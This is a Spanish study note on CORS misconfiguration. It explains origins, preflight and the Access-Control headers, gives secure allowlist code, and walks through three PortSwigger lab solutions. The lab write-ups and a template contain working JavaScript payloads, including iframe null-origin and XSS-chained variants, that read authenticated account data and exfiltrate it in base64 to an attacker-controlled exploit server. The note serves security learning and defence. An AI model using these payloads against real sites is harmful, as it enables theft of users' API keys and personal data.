---
aliases:
  - CORS
  - Cross-Origin Resource Sharing
tags:
  - sec/web
  - sec/web/cors
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Cross-Site Scripting XSS]]"
  - "[[Cross-Site Request Forgery (CSRF)]]"
  - "[[Vulnerabilidades OAuth en PortSwigger Labs]]"
  - "[[Envenenamiento de Caché Web]]"
  - "[[Insecure Direct Object References IDOR]]"
fuente: "https://portswigger.net/web-security/cors"
---
# Intercambio de Recursos de Origen Cruzado (CORS)

**CORS** (*Cross-Origin Resource Sharing*) es un mecanismo **por el que el servidor autoriza explícitamente** qué orígenes pueden leer sus respuestas desde JavaScript del navegador. Lejos de "restringir el acceso", CORS existe para **relajar de forma controlada** la Política del Mismo Origen (*Same-Origin Policy, SOP*): sin él, cualquier sitio podría leer respuestas de cualquier API; con él mal configurado (reflejo de `Origin` + credenciales), cualquier sitio puede **robar datos autenticados de cualquier usuario** que visite una página atacante.

> [!info] Propósito de CORS
> La SOP impide que el JS de `attacker.com` lea la respuesta de `api.example.com`, pero permite enviarle peticiones (*fire and forget*, tipo CSRF). CORS añade un canal de **negociación** entre navegador y servidor (cabeceras `Access-Control-*`) que decide si el JS **puede leer la respuesta**. El navegador lo impone él mismo: el servidor solo *declara* su política — por eso una política permisiva es exactamente tan grave como suena: el navegador la respeta y entrega los datos al JS atacante.

Supongamos una aplicación en `example.com` que consume una API en `api.example.com`. Con CORS correcto, el servidor de la API solo autoriza el origen `https://www.example.com`; un intento desde `attacker.com` es bloqueado por el navegador. Con CORS defectuoso — el servidor refleja cualquier `Origin` en `Access-Control-Allow-Origin` y añade `Access-Control-Allow-Credentials: true` — el navegador entregará al atacante **cualquier respuesta autenticada con cookies del usuario**.

> [!warning] Riesgos de una mala configuración CORS
> Exposición de datos sensibles (APIs con sesión de cookie), ejecución de acciones no autorizadas en nombre del usuario y toma de control de cuentas. Ocurre cuando el servidor: refleja orígenes arbitrarios, confía en el origen `null`, permite subdominios no controlados, o acepta cualquier protocolo (`http://` de un subdominio comprometido). El vector habitual de descubrimiento es automatizado: probar valores de `Origin` y leer `Access-Control-Allow-Origin` en la respuesta.

## Mecánica: cómo funciona CORS por debajo

### El concepto de "origen"

El origen = **esquema + host + puerto**. Cualquier diferencia — aunque sea un subdominio o el puerto — genera un origen distinto:

| URL | Origen |
|---|---|
| `https://app.com/a` | `https://app.com` |
| `https://app.com/b` | `https://app.com` (mismo origen) |
| `http://app.com` | `http://app.com` (esquema distinto → cruzado) |
| `https://sub.app.com` | `https://sub.app.com` (host distinto → cruzado) |
| `https://app.com:8443` | `https://app.com:8443` (puerto distinto → cruzado) |
| `null` | Contextos opacos: `iframe sandbox`, `data:`, `file:`, redirección desde `about:blank` |

### Tipos de petición cruzada

| Categoría | Ejemplos | ¿Preflight? |
|---|---|---|
| **Simple** | `GET`, `POST`, `HEAD`; headers simples (`Accept`, `Content-Type: application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`); sin credenciales salvo cookies del dominio | No — se envía directo |
| **Pre-flighted** | Cualquier otro método (`PUT`, `DELETE`, `PATCH`), `Content-Type: application/json`, headers custom (`Authorization`, `X-Api-Key`), `withCredentials` sobre ciertos contextos | Sí — el navegador envía primero un `OPTIONS` |

El **preflight** es un `OPTIONS` con `Origin` + `Access-Control-Request-Method`; el servidor responde qué orígenes/métodos/headers acepta. Si el preflight falla, la petición real **no se envía**.

### Cabeceras que gobiernan el mecanismo

| Cabecera | Dónde | Significado |
|---|---|---|
| `Origin` | Petición | Origen del JS que hace la petición (la añade el navegador, no manipulable desde JS salvo CORS-opaco) |
| `Access-Control-Allow-Origin` (ACAO) | Respuesta | Origen(es) autorizado(s): `https://app.com`, `*`, o **reflejo** |
| `Access-Control-Allow-Credentials` (ACAC) | Respuesta | `true` = el navegador puede enviar/recibir cookies en la petición cruzada. Con `*` en ACAO está prohibido por spec |
| `Access-Control-Allow-Methods` | Respuesta (preflight) | Métodos permitidos |
| `Access-Control-Allow-Headers` | Respuesta (preflight) | Headers permitidos |
| `Access-Control-Expose-Headers` | Respuesta | Headers que el JS puede leer de la respuesta |
| `Access-Control-Max-Age` | Respuesta (preflight) | Caché del preflight (segundos) |
| `Vary: Origin` | Respuesta | Indica a cachés/proxies que la respuesta varía por `Origin` (clave contra poisoning de caché CORS) |

> [!warning] `Access-Control-Allow-Credentials: true`
> Este encabezado es crítico. Cuando se establece en `true`, permite que el navegador envíe y reciba cookies de autenticación, encabezados HTTP de autorización o certificados TLS del cliente en solicitudes de origen cruzado. Si se combina con un `Access-Control-Allow-Origin` que permite orígenes arbitrarios o controlados por el atacante, se convierte en una vulnerabilidad grave, ya que un atacante puede realizar solicitudes autenticadas en nombre del usuario.

### Clasificación de configuraciones vulnerables

| Clase | Señal en respuesta | Explotación |
|---|---|---|
| **Reflejo con credenciales** | `ACAO: <cualquier Origin>` + `ACAC: true` | Cualquier web roba datos de usuarios logueados |
| **Reflejo sin credenciales** | `ACAO: <Origin reflejado>`, sin `ACAC` | Solo datos públicos/anonymous — bajo impacto salvo token en body |
| **Origen `null` confiable** | `ACAO: null` + `ACAC: true` | `iframe sandbox` + `srcdoc` → origen opaco `null` |
| **Wildcard con credenciales** | `ACAO: *` + `ACAC: true` | El navegador lo rechaza (spec) — inútil, pero revela intención |
| **Subdominios confiados** | Sufijo matching: `ACAO: https://*.app.com` mal parseado, o regex por `contains` | XSS en cualquier subdominio → acceso a la API |
| **Protocolos inseguros** | Se confía `http://app.com` además de `https://` | MITM/downgrade o subdominio dev con HTTP |
| **Cache poisoning CORS** | Respuesta con ACAO reflejado **sin** `Vary: Origin` | El origen atacante queda cacheado y servido a todos |

## Metodología de testing (CORS con credenciales)

1. **Buscar superficie**: endpoints con datos personales (accountDetails, /api/me, /user). Autenticarse primero (wiener:peter en labs).
2. **Probar reflejo**: añadir `Origin: https://evil.com` a la petición autenticada y leer la respuesta:
   - `Access-Control-Allow-Origin: https://evil.com` → reflejo. ✔ vulnerable.
   - `ACAO: https://evil.com` + `ACAC: true` → **robo directo de datos**.
3. **Probar `null`**: `Origin: null` → si responde `ACAO: null` + `ACAC: true`, explotar con `<iframe sandbox="allow-scripts" srcdoc='...'>`.
4. **Probar sufijos**: `Origin: https://evil.com` vs `Origin: https://vuln-site.com.evil.com`, `Origin: https://evil-vuln-site.com` (regex `contains`/`endsWith`).
5. **Probar subdominios**: `https://test.vuln-site.com` → si se acepta, buscar XSS en cualquier subdominio ([[Cross-Site Scripting XSS]]) y usarlo como origen.
6. **Explotar**: página atacante con `XMLHttpRequest`/`fetch` + `credentials: 'include'`, exfiltrar la respuesta por `location`/`fetch` al servidor del atacante (en los labs, en base64 para evitar filtros).
7. **Caché**: verificar si el `ACAO` reflejado se cachea (enviar dos orígenes distintos y comparar respuestas sin `Vary: Origin`).

### Plantilla de explotación (robo de datos con credenciales)

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    location = "https://TU-EXPLOIT-SERVER/?data=" + btoa(req.responseText);
  };
  req.open("GET", "https://objeto/accountDetails", true);
  req.withCredentials = true;   // credentials: include → cookies del usuario
  req.send();
</script>
```

```html
<!-- Origen null vía iframe sandbox + srcdoc -->
<iframe sandbox="allow-scripts" srcdoc='<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    location = "https://TU-EXPLOIT-SERVER/?data=" + btoa(req.responseText);
  };
  req.open("GET", "https://objeto/accountDetails", true);
  req.withCredentials = true;
  req.send();
</script>'></iframe>
```

## Detección

- **Manual**: modificar `Origin` y leer `ACAO`/`ACAC` en la respuesta — la señal es 100% en los headers.
- **Burp**: extensión *CORS Checker* / *Burp Pro Scanner* detecta reflejo y credenciales.
- **Script**: repetir la petición con 4 orígenes (`https://evil.com`, `null`, `https://objetо.com.evil.com`, el propio dominio) y comparar headers.
- Falsos positivos: `ACAO` con `ACAC` **ausente** y datos públicos → informativo, no explotable para robo.

## Impacto concreto

1. **Robo de datos autenticados**: API key, PII, mensajes, tokens — todo lo que el endpoint devuelva a un usuario logueado, extraíble desde una página atacante con su cookie.
2. **Toma de cuentas**: si la API permite cambio de password/email y CORS la expone → account takeover completo.
3. **Acción como usuario**: POST/DELETE si los métodos están permitidos (equivale a CSRF **con lectura de la respuesta**, mucho peor).
4. **Cascada con XSS/caché**: subdominio con XSS + CORS confiable = API completa; `ACAO` cacheado = envenenamiento masivo.

## Defensa (con código)

```javascript
// SEGURO (Node/Express): allowlist exacta de orígenes, reflejo solo si coincide
const ALLOWED = new Set([
  "https://www.mi-dominio.com",
  "https://app.mi-dominio.com",
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && ALLOWED.has(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Access-Control-Allow-Credentials", "true");
    res.setHeader("Vary", "Origin");        // clave para cachés/proxies
  }
  // No ACAO = el navegador bloquea la lectura cruzada
  if (req.method === "OPTIONS") {
    res.setHeader("Access-Control-Allow-Methods", "GET, POST");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
    return res.status(204).end();
  }
  next();
});
```

```php
// SEGURO (PHP): nunca concatenar el Origin; comparar contra allowlist
$allowed = ['https://www.mi-dominio.com', 'https://app.mi-dominio.com'];
$origin  = $_SERVER['HTTP_ORIGIN'] ?? '';
if (in_array($origin, $allowed, true)) {
    header("Access-Control-Allow-Origin: $origin");
    header('Access-Control-Allow-Credentials: true');
    header('Vary: Origin');
}
```

```apache
# Apache — no confiar en null; exigir Vary
<IfModule mod_headers.c>
    Header set Vary "Origin"
    # Nunca: Header set Access-Control-Allow-Origin "*" junto a Allow-Credentials
</IfModule>
```

Reglas duras:
- **Jamás** reflejar `Origin` sin validar contra allowlist exacta (host completo, no sufijos).
- **Jamás** combinar `ACAO: *` con `ACAC: true` (el navegador lo rechaza, pero indica diseño roto).
- **No confiar en `null`** salvo caso de negocio explícito.
- Cerrar el círculo: si los subdominios están en la allowlist, duramente controlados (HTTPS, sin XSS, sin dev/legacy) — ver [[Cross-Site Scripting XSS]].
- Todo endpoint con datos privados debe validar la sesión **y** el origen cuando el CORS lo permita.

## PortSwigger

### Lab: CORS vulnerability with basic origin reflection

Se tiene una configuración de CORS insegura, donde tenemos que obtener la API key del administrador.
Podemos hacer login con `wiener:peter`:
![[Pasted image 20250915085610.png]]

Vemos que al ingresar nos carga la API key, no es inmediata por lo que por seguridad podemos esperar un tiempo antes de obtenerla.

El concepto es que se pueda aprovechar de sesiones activas donde, mediante el arrastrar la cookie o lo que sea necesario para mantener la sesión activa, vamos a realizar acciones como el usuario. En sí, la mala configuración del CORS lo permite.

Vamos a recargar la web que carga la API Key para capturar y ver qué se está tramitando:
![[Pasted image 20250915090526.png]]

Al parecer se tramita una segunda petición a `accountDetails` y vamos a ver su respuesta:
![[Pasted image 20250915090653.png]]

Vemos todos los datos de la cuenta en formato JSON. Además, también vemos en la petición `Access-Control-Allow-Credentials: true` y esto le dice al navegador si exponer la respuesta del código JavaScript, además permite que el navegador envíe cookies, tokens de sesión u otros datos en la solicitud.

> [!warning] `Access-Control-Allow-Credentials: true`
> Este encabezado es crítico. Cuando se establece en `true`, permite que el navegador envíe y reciba cookies de autenticación, encabezados HTTP de autorización o certificados TLS del cliente en solicitudes de origen cruzado. Si se combina con un `Access-Control-Allow-Origin` que permite orígenes arbitrarios o controlados por el atacante, se convierte en una vulnerabilidad grave, ya que un atacante puede realizar solicitudes autenticadas en nombre del usuario.

Bueno, cuando nosotros creemos la web maliciosa, al realizar la petición se debería agregar un encabezado llamado `Origin` el cual indica desde dónde se tramita la solicitud. No lo vemos en la petición de la captura debido a que, al ser del mismo origen, no lo necesita, pero podemos intentar agregarlo y ver qué sucede:

![[Pasted image 20250915091412.png]]

Vemos que se agrega en la respuesta y esto es un problema ya que se está contemplando como que cualquier valor u origen sea válido y esto, con el `true` del control de acceso, provoca el CORS.

> [!tip] Reflejo del encabezado `Origin`
> Si el servidor refleja el valor del encabezado `Origin` directamente en el encabezado `Access-Control-Allow-Origin` de la respuesta, indica una configuración vulnerable. Esto significa que cualquier origen que el atacante especifique será considerado "permitido" por el servidor, abriendo la puerta a ataques de origen cruzado.

Entonces el código y la idea detrás del mismo será la siguiente:
```html
<script>
  var req = new XMLHttpRequest();
  req.open("GET", "https://0a860017042ab7a080c50d680057007c.web-security-academy.net/my-account/accountDetails", true);
  req.withCredentials = true;
  req.send();
</script>
```

La lógica es crear una petición de forma asíncrona a la ruta que nos retorna los datos y para jugar o arrastrar las credenciales válidas que se emplean ya almacenadas usamos `withCredentials=true` antes de enviar la solicitud. Veámoslo:
![[Pasted image 20250915092410.png]]

![[Pasted image 20250915092635.png]]

Parece que funciona. Ahora el objetivo es enviarnos estos datos de la respuesta a nosotros. Para hacerlo vamos a hacer lo siguiente en nuestro código:
```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    location = "https://exploit1a9200220415b76580890c0f0185006d.exploit-server.net/?apikey=" + btoa(req.responseText);
  }
  req.open("GET", "https://0a860017042ab7a080c50d680057007c.web-security-academy.net/my-account/accountDetails", true);
  req.withCredentials = true;
  req.send();
</script>
```

Lo que aumentamos es el `req.onload` el cual solo se ejecuta luego de cargar la solicitud por completo y, mediante una función, lo que hacemos es con `location` enviar una petición al servidor del atacante el contenido de la respuesta en Base64.

Vemos si esto funciona:
![[Pasted image 20250915093150.png]]

![[Pasted image 20250915100527.png]]
Revisando los logs, pues sí funcionó y ya con esto veamos si se tramita el contenido de nuestro usuario:
![[Pasted image 20250915100659.png]]
Perfecto, ahora ya podemos hacer lo mismo para la víctima y vemos qué obtenemos:
![[Pasted image 20250915100810.png]]
Ahora con esto podemos completar la máquina:
![[Pasted image 20250915100846.png]]
Lab Terminado.

### Lab: CORS vulnerability with trusted null origin

El objetivo es el mismo, pero al parecer podemos enviar un origen nulo.

Volvemos a capturar peticiones y vemos lo mismo:
![[Pasted image 20250915110738.png]]
El `Access-Control-Allow-Credentials: true` ya nos está dando un indicio de que podrían acontecerse orígenes cruzados.

Vamos a intentar enviar `Origin` a ver qué sucede:
![[Pasted image 20250915110928.png]]

No nos refleja el origen en la cabecera, por lo que no está admitiendo cualquier origen. Así que vamos a intentar con origen nulo a ver qué sucede:
![[Pasted image 20250915111045.png]]

Perfecto, vemos que si enviamos un origen nulo funciona, ya vemos la cabecera. En este punto tenemos que encontrar la forma de enviar un origen `null`.

Ahora, este origen `null` no lo podemos definir de forma directa, pero con ayuda de `iframe` y un truquito lo podemos hacer. El concepto es sencillo, en realidad vamos a jugar con el `iframe` y le definimos con un `sandbox` permisos mínimos los cuales solo interpreten código JavaScript. Luego tenemos algo llamado `srcdoc` el cual nos permite definir contenido dentro del `iframe` y aquí es donde se acontece el `null` debido a dos conceptos: el contenido dentro de un `srcdoc` se considera como un origen único/nulo por seguridad, además el `sandbox` también impone restricciones que afectan al mismo origen.

> [!info] Origen Nulo con `iframe` y `srcdoc`
> Un `iframe` con el atributo `sandbox` y contenido definido por `srcdoc` crea un contexto de navegación con un "origen nulo". Esto se debe a que el contenido de `srcdoc` no tiene una URL asociada y el `sandbox` aísla aún más el contenido, haciendo que el navegador le asigne un origen único y opaco (null). Si el servidor CORS confía en el origen `null`, un atacante puede explotar esto para realizar solicitudes de origen cruzado.

Entendiendo eso, podemos aprovecharnos para definir el origen `null` de la siguiente manera:
```html
<iframe sandbox="allow-scripts" srcdoc='<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
  location = "https://exploit-0a92000504b3a86b8294e7ea01350069.exploit-server.net/?apiKey=" + btoa(req.responseText);
  };
  req.open("GET", "https://0a82005b0487a8638271e8fc00c000a3.web-security-academy.net/accountDetails", true);
  req.withCredentials = true;
  req.send();
  </script>'></iframe>
```

Como vemos, usamos el `sandbox` y el `srcdoc` para enviar un origen `null`. Vemos qué sucede:
![[Pasted image 20250915113220.png]]
![[Pasted image 20250915113246.png]]

Obtenemos resultado, vemos el contenido:
![[Pasted image 20250915113323.png]]
Perfecto, podemos completar el lab.
![[Pasted image 20250915113401.png]]

Lab Terminado.

### Lab: CORS vulnerability with trusted insecure protocols

En este caso se acontece un CORS donde por alguna razón se confía en todos los dominios sin importar el protocolo y de igual forma tenemos que conseguir la `ApiKey` del administrador.

![[Pasted image 20250915114853.png]]

Tanto lo que es `Origin` de otro tipo o nulos no funcionan. Nos está hablando de subdominios. Si probamos con el dominio de la misma web, veamos qué pasa:
![[Pasted image 20250915115010.png]]
Perfecto, sí es permitido tanto `http` como `https`. Podemos tratar de ver agregando cosas como `https://test....`:
![[Pasted image 20250915115108.png]]
Esto nos lo permite, por lo que por subdominios nos lo permite. Entonces tenemos que de alguna forma encontrar algún subdominio.
![[Pasted image 20250915115216.png]]
Al verificar por cosas disponibles de la que tenemos, vemos que nos envía a otra ventana:
![[Pasted image 20250915115255.png]]

Perfecto, vemos otro dominio. Ahora vemos en la URL que se maneja por identificador. Podemos intentar colarle allí una inyección XSS:
![[Pasted image 20250915115542.png]]
Lo interpreta y sí es completamente vulnerable.

> [!warning] Combinación de XSS y CORS
> La combinación de una vulnerabilidad XSS en un subdominio confiable y una política CORS permisiva para ese subdominio (incluso con diferentes protocolos) es extremadamente peligrosa. El XSS permite al atacante ejecutar código JavaScript arbitrario en el contexto del subdominio, y la política CORS permite que ese código realice solicitudes autenticadas a la API principal, eludiendo la Política del Mismo Origen.

En este punto podemos ver si este dominio nos lo contempla para usarlo en el `Origin`:
![[Pasted image 20250915115644.png]]
Excelente, sí se contempla.

Con esto vamos a dejar claro cómo se va a interactuar: vamos a primero redirigir al usuario a la web donde tenemos la inyección XSS y desde allí con el XSS vamos a realizar la inyección para extraer la `ApiKey` del usuario admin. Entonces vemos cómo queda el código malicioso de la web:
```html
<script>
document.location = "http://stock.0ac300b9038e41a18141257700b400a9.web-security-academy.net/?productId=%3Cscript%3Evar%20req%20=%20new%20XMLHttpRequest();req.onload%20=%20function%20()%20{location%20=%27https://exploit-0a6c004a031f41c581a924cc01be004e.exploit-server.net/?apiKey=%27%20%2b%20btoa(req.responseText);};req.open(%27GET%27,%20%22https://0ac300b9038e41a18141257700b400a9.web-security-academy.net/accountDetails%22,%20true);req.withCredentials%20=%20true;req.send();%3C/script%3E&storeId=2";
</script>
```

Lo que tenemos dentro del `location` está URL-encoded, pero sería la inyección de la siguiente manera:
```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    location =
      'https://exploit-0a6c004a031f41c581a924cc01be004e.exploit-server.net/?apiKey=' + btoa(req.responseText);
  };
  req.open('GET', "https://0ac300b9038e41a18141257700b400a9.web-security-academy.net/accountDetails", true);
  req.withCredentials = true;
  req.send();
</script>
```

Bueno, enviamos esto y vemos que recibimos la petición en el log:
![[Pasted image 20250915122549.png]]
![[Pasted image 20250915122556.png]]
Lo desciframos y vemos lo siguiente:
![[Pasted image 20250915122628.png]]
Completamos la máquina:
![[Pasted image 20250915122652.png]]

Lab Terminado.

## Errores comunes

**Del atacante:**
1. Probar solo `Origin: https://evil.com` y no `null`, sufijos ni subdominios — se pierden las clases "trusted null origin" y "trusted insecure protocols".
2. Olvidar `withCredentials`/`credentials: 'include'`: sin él, el navegador no envía cookies y la respuesta será el contenido anónimo (falso "no vulnerable").
3. Reportar reflejo sin `ACAC` como robo de datos: sin credenciales solo afecta a datos públicos.
4. No verificar caché: un `ACAO` reflejado sin `Vary: Origin` es envenenamiento masivo (mayor severidad).
5. Descartar CORS cuando el header es `*`: primero comprobar si hay datos valiosos sin autenticar y si el `ACAC` puede combinarse vía otro bug.

**Del defensor:**
1. Reflejar `Origin` "porque el navegador lo pide": el navegador no exige reflejar; exige **decidir**.
2. Validar el origen con `endsWith`/`contains`/regex laxa: `mi-dominio.com.evil.com` *empieza* por tu dominio; cualquier matching no exacto es bypass.
3. Dejar `Vary: Origin` ausente: los CDN/cachés sirven el ACAO de un atacante a todos los usuarios.
4. Confiar en subdominios abandonados (dev, staging, legacy) dentro del allowlist: XSS ahí = API completa.
5. Proteger CORS pero exponer los mismos datos sin sesión en otro endpoint.

## Cheatsheet

| Paso | Acción / cabecera |
|---|---|
| Probar reflejo | Añadir `Origin: https://evil.com` → leer `ACAO` |
| Clave de explotación | `ACAO: <tu origen>` + `ACAC: true` + `withCredentials` |
| Origen null | `<iframe sandbox="allow-scripts" srcdoc=...>` |
| Preflight | `OPTIONS` con `Access-Control-Request-Method` |
| Señal de diseño correcto | Allowlist exacta + `Vary: Origin` |
| Señal rota #1 | `ACAO` = reflejo arbitrario |
| Señal rota #2 | `ACAO: null` con credenciales |
| Señal rota #3 | Cualquier subdominio/protocolo aceptado |
| Defensa | Allowlist exacta de hosts + comparación de igualdad + `Vary: Origin` |

## Laboratorios y referencias

- **PortSwigger Academy — CORS**: https://portswigger.net/web-security/cors (los 3 labs de esta nota: basic origin reflection, trusted null origin, trusted insecure protocols)
- **PortSwigger — CORS research**: https://portswigger.net/research/pulling-at-strings-in-the-cors-of-might
- **OWASP — CORS misconfiguration**: https://owasp.org/www-project-web-security-testing-guide/
- Notas internas: [[Cross-Site Scripting XSS]], [[Cross-Site Request Forgery (CSRF)]], [[Envenenamiento de Caché Web]], [[Vulnerabilidades OAuth en PortSwigger Labs]]

## Relacionadas

- [[Cross-Site Scripting XSS]] — el eslabón que convierte "subdominio confiable" en "API completa"
- [[Cross-Site Request Forgery (CSRF)]] — el primo que actúa sin leer la respuesta
- [[Vulnerabilidades OAuth en PortSwigger Labs]] — orígenes y redirects en flujos de autorización
- [[Envenenamiento de Caché Web]] — `ACAO` cacheado sin `Vary: Origin`
- [[Insecure Direct Object References IDOR]] — cuando los datos expuestos vía CORS son objetos directos
- [[Vulnerabilidad de Redirección Abierta]] — otro mecanismo de confianza cruzada mal validado